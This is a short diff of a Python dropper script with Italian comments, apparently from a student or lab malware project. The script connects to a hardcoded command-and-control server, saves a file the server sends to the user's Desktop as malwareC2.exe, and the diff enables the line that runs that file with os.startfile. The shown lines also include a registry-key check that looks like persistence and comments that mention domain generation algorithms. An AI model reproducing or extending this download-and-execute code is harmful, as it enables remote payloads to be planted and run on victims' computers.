@@ -71,14 +71,14 @@ if __name__ == '__main__':
         print("Chiave di registro già presente")
 
     # connessione al server C2
-    ip_server = "192.168.1.5"  # l'ip è hardcoded ma esistono gli algoritmi di domain generation (DGA)
+    ip_server = "192.168.10.10"  # l'ip è hardcoded ma esistono gli algoritmi di domain generation (DGA)
     port_server = 65438
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print("Tentativo di connessione al server C2...")
     server.connect((ip_server, port_server))
     print("Connessione al server C2 avvenuta con successo!")
     # per Giordano: qui mettici pure il percorso in cui vuoi che venga scaricato il malware che ti invia il server
-    path_real_malware_from_C2 = r'C:\\Users\\' + os.getlogin() + r'\\Desktop\\evil.vba'
+    path_real_malware_from_C2 = r'C:\\Users\\' + os.getlogin() + r'\\Desktop\\malwareC2.exe'
 
     # genero la coppia di chiavi pubblica-privata
     (publicKey, privateKey) = rsa.newkeys(1024)
@@ -107,4 +107,4 @@ if __name__ == '__main__':
     print("Terminato!")
     server.close()
     # eseguo il malware
-    #os.startfile(path_real_malware_from_C2)
+    os.startfile(path_real_malware_from_C2)
